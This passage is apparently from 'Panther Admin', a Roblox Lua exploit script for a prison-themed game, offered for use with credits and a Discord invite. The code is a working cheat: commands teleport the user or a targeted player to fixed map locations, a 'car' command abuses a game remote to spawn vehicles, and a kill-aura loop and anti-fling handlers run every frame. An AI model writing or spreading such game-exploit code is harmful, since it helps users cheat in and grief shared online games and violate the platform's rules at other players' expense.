	end
	if PlayerCheckCommand("nex") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
			end
		else
			Kaito:bring(Speaker, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
		end
	end
	if PlayerCheckCommand("ExploitersBase") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		end
	end
	if PlayerCheckCommand("School2") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		end
	end
	if PlayerCheckCommand("School1") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		end
	end
	if PlayerCheckCommand("Whitehouse") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		end
	end
	if PlayerCheckCommand("Mansion") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		end
	end
	if PlayerCheckCommand("prison") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
			end
		else
			Kaito:bring(Speaker, CFrame.new(916.738098, 99.989975, 2375.38403, 0.99996829, 0, 0.00796249602, 0, 1, 0, -0.00796249602, 0, 0.99996829))
		end
	end
	if PlayerCheckCommand("yard") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			Kaito:bring(Speaker, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
		end
	end
	if PlayerCheckCommand("tower") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(822.355164, 142.638184, 2587.71753, 0.999500692, 1.78500699e-08, -0.0315965861, -1.87901747e-08, 1, -2.94564462e-08, 0.0315965861, 3.00354444e-08, 0.999500692))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(822.355164, 142.638184, 2587.71753, 0.999500692, 1.78500699e-08, -0.0315965861, -1.87901747e-08, 1, -2.94564462e-08, 0.0315965861, 3.00354444e-08, 0.999500692))
			end
		else
			Kaito:bring(Speaker, CFrame.new(822.355164, 142.638184, 2587.71753, 0.999500692, 1.78500699e-08, -0.0315965861, -1.87901747e-08, 1, -2.94564462e-08, 0.0315965861, 3.00354444e-08, 0.999500692))
		end
	end
	if PlayerCheckCommand("cbase") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(-843.855469, 93.7955246, 2058.3606, 0.00948868692, -4.14198537e-10, 0.999954998, 6.77936429e-10, 1, 4.07784168e-10, -0.999954998, 6.74036604e-10, 0.00948868692))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(-843.855469, 93.7955246, 2058.3606, 0.00948868692, -4.14198537e-10, 0.999954998, 6.77936429e-10, 1, 4.07784168e-10, -0.999954998, 6.74036604e-10, 0.00948868692))
			end
		else
			Kaito:bring(Speaker, CFrame.new(-843.855469, 93.7955246, 2058.3606, 0.00948868692, -4.14198537e-10, 0.999954998, 6.77936429e-10, 1, 4.07784168e-10, -0.999954998, 6.74036604e-10, 0.00948868692))
		end
	end
if PlayerCheckCommand("SecretRoom") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("CCTV") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("Lobby") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("Armory") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("Cells") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("Trap") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("Gate") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("GuardTower") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("PrisonBack") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("Office") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
			end
		else
			Kaito:bring(Speaker, CFrame.new(840.902344, 99.9899826, 2265.74536, 0.0302555375, -3.3549501e-08, 0.999542177, -4.92125558e-08, 1, 3.50545015e-08, -0.999542177, -5.02506197e-08, 0.0302555375))
		end
	end
	if PlayerCheckCommand("saferoom") then
		if Arg2_P == "me" then
			Kaito:bring(Speaker, CFrame.new(704.895935, 99.9899826, 2373.47876, 0.0323696211, -1.06273255e-07, -0.999475956, -4.96659567e-08, 1, -1.07937481e-07, 0.999475956, 5.3133828e-08, 0.0323696211))
		elseif Arg2_P then
			local Target = Kaito:FindPlayer(Arg2_P)
			if Target then
				Kaito:bring(Target, CFrame.new(704.895935, 99.9899826, 2373.47876, 0.0323696211, -1.06273255e-07, -0.999475956, -4.96659567e-08, 1, -1.07937481e-07, 0.999475956, 5.3133828e-08, 0.0323696211))
			end
		else
			Kaito:bring(Speaker, CFrame.new(704.895935, 99.9899826, 2373.47876, 0.0323696211, -1.06273255e-07, -0.999475956, -4.96659567e-08, 1, -1.07937481e-07, 0.999475956, 5.3133828e-08, 0.0323696211))
		end
	end
	if PlayerCheckCommand("car") then
		pcall(function()
			local Older = Kaito:GetPosition()
			local OldPos = Speaker.Character:GetPrimaryPartCFrame()
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-910, 95, 2157))
			wait()
			local car = nil
			task.spawn(function()
				car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
			end)
			repeat wait(.1)
				local ohInstance1 = game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[8]["Car Spawner"]
				workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
			until car
			repeat task.wait() until car:FindFirstChild("RWD") and car:FindFirstChild("Body") and car:FindFirstChild("Body"):FindFirstChild("VehicleSeat")
			car.PrimaryPart = car.RWD
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(OldPos)
			wait(1)
			local Done = false
			car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
			repeat 
				game:GetService("RunService").RenderStepped:Wait()
				car:SetPrimaryPartCFrame(OldPos)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =CFrame.new(car.Body.VehicleSeat.Position)
				car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
				if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit == true then
					Done = true
				end
			until Done
			wait(.3)
			Kaito:UnSit()
			Kaito:MoveTo(Older)
		end)
	end
end
game:GetService("RunService").RenderStepped:Connect(function()--//Global Runservice
	if not Unloaded and States.killaura and Temp.KillPart and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health >1 then
		Temp.KillPart.CFrame = CFrame.new(Kaito:GetPosition().Position)
	else
		if Temp.KillPart and States.killaura then
			Temp.KillPart.CFrame = CFrame.new(1,838539835428,0)
		elseif not Temp.KillPart and States.killaura then
			Kaito:CreateKillPart()
		end
	end
end)

local function PlayerAddedANTIFLING(Player)
	if Unloaded or not States.AntiFling then
		return
	end
	local Detected = false
	local Character;
	local PrimaryPart;

	local function CharacterAdded(NewCharacter)
		Character = NewCharacter
		repeat
			wait()
			PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
		until PrimaryPart
		Detected = false
	end

	CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
	Player.CharacterAdded:Connect(CharacterAdded)
	game:GetService("RunService").Heartbeat:Connect(function()
		if not Unloaded and  States.AntiFling then
			if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
				if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
					Detected = true
					for i,v in ipairs(Character:GetDescendants()) do
						if v:IsA("BasePart") then
							v.CanCollide = false
							v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
							v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
							v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
						end
					end
					PrimaryPart.CanCollide = false
					PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
					PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
					PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
				end
			end
		end
	end)
end
for i,v in ipairs(game:GetService("Players"):GetPlayers()) do
	if v ~= plr then
		PlayerAddedANTIFLING(v)
	end
end
game:GetService("Players").PlayerAdded:Connect(PlayerAddedANTIFLING)

local LastPosition = nil
game:GetService("RunService").Heartbeat:Connect(function()
	if not Unloaded and States.AntiFling then
		pcall(function()
			local PrimaryPart = plr.Character.PrimaryPart
			if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
				PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
				PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
				PrimaryPart.CFrame = LastPosition
			elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
				LastPosition = PrimaryPart.CFrame
			end
		end)
	end
end)
local DefaultChatSystemChatEvents = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
Kaito:Notif(">noinvite to disable discord inviter!",nil,true)
CmdBarFrame:TweenPosition(UDim2.new(0.5, 0, 0, 10)-UDim2.new(0,0,.05,0),"Out","Back",.5)

--------Upper WaterMark
-- Function to create a mobile-friendly watermark at the top-left corner
function createTopLeftWatermark()
    -- Create a ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "TopLeftWatermarkGui"
    screenGui.IgnoreGuiInset = true -- Ensures the GUI isn't blocked by device notches or similar elements
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    -- Create a Frame to hold the watermark
    local watermarkFrame = Instance.new("Frame")
    watermarkFrame.Size = UDim2.new(0.3, 0, 0, 30) -- Width is 30% of the screen width, height is 30 pixels
    watermarkFrame.Position = UDim2.new(0, 0, 0, 0) -- Top-left corner
    watermarkFrame.BackgroundTransparency = 1 -- Fully transparent background
    watermarkFrame.Parent = screenGui

    -- Create a TextLabel for the watermark text
    local watermarkLabel = Instance.new("TextLabel")
    watermarkLabel.Size = UDim2.new(1, 0, 1, 0)
    watermarkLabel.Position = UDim2.new(0, 0, 0, 0)
    watermarkLabel.Text = '<font color="rgb(102, 0, 153)">PANTHER ADMIN</font>'
    watermarkLabel.TextColor3 = Color3.fromRGB(102, 0, 153)
    watermarkLabel.BackgroundTransparency = 1
    watermarkLabel.Font = Enum.Font.SourceSans
    watermarkLabel.TextScaled = true
    watermarkLabel.TextWrapped = true
    watermarkLabel.RichText = true -- Enable rich text
    watermarkLabel.Parent = watermarkFrame

    -- Optionally, you can set the watermark to be always on top of other GUI elements
    screenGui.DisplayOrder = 1000
end

-- Example usage
createTopLeftWatermark()

-- Function to create a game notification



---------Loaded Notification
-- Function to send a system message that only the player can see
local function chatMessage(message)
    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
        Text = message,
        Color = Color3.new(1, 1, 1), -- Default color (will be overridden by RichText)
        Font = Enum.Font.SourceSansBold, -- Font style
        FontSize = Enum.FontSize.Size24, -- Font size
        TextStrokeTransparency = 0 -- Ensure stroke is visible
    })
end

-- Example usage with RichText
chatMessage('<font color="rgb(0, 255, 0)">[H17S3]</font>: <font color="rgb(255, 215, 0)">You Executed Panther Admin! OMG?!?!?</font>')
wait(3)
chatMessage('<font color="rgb(0, 255, 0)">[Panther Admin]</font>: <font color="rgb(255, 215, 0)">Made By [H17S3] Continue By [Dalloc] Rewrite By [0946is]</font>')
wait(3)
chatMessage('<font color="rgb(0, 255, 0)">[Dalloc]</font>: <font color="rgb(255, 215, 0)">Panther Admin Reborn With Tiger Admin Custom Premium.</font>')
wait(3)
chatMessage('<font color="rgb(0, 255, 0)">[0946is]</font>: <font color="rgb(255, 215, 0)">I added new teleport commands. secretroom, mansion, exploiterbase, trap, guardtower, gate, prisonback, cells, whitehouse, lobby, Cctv, Armory, office, and more.</font>')
wait(3)
chatMessage('<font color="rgb(0, 255, 0)">[0946iis]</font>: <font color="rgb(255, 215, 0)">Make Sure To Join in the Communication Server! For new updates! discord.gg/z5RcxpauJH/</font>')
wait(3)
chatMessage('<font color="rgb(0, 255, 0)">[Aestheticall]</font>: <font color="rgb(255, 215, 0)">MORE COMMANDS TO COME!</font>')
wait(3)
chatMessage('<font color="rgb(0, 255, 0)">[Aestheticall]</font>: <font color="rgb(255, 215, 0)">VERSION 1.23.5</font>')

wait(10)

-- Notification for Owner and Co-owner User IDs
local owner = 2621280490 -- Replace with the owner's User ID
local coOwner = 4688179501 -- Replace with the co-owner's User ID

-- Function to display the notification
local function displayNotification(userName)
    local success, error = pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = userName .. " here!",
            Text = "The Developer is Here!",
            Icon = 'rbxassetid://18207923093',
            Duration = 10,
        })
    end)
    if not success then
        warn("Failed to send notification:", error)
    end
end

-- Function to check if a player is the owner or co-owner and display notification
local function checkAndNotify(player)
    if player.UserId == owner then
        displayNotification("Aestheticall") -- Replace with the owner's username
    elseif player.UserId == coOwner then
        displayNotification("All") -- Replace with the co-owner's username
    end
end

-- Function to check all players currently in the game
local function checkAllPlayers()
    local players = game:GetService("Players"):GetPlayers()
    for _, player in ipairs(players) do
        if player ~= game:GetService("Players").LocalPlayer then
            checkAndNotify(player)
        end
    end
end

-- Initial check for all players currently in the game
checkAllPlayers()

-- Connect the PlayerAdded event to check new players
game:GetService("Players").PlayerAdded:Connect(function(player)
    checkAndNotify(player)
end)

------------end of notifications

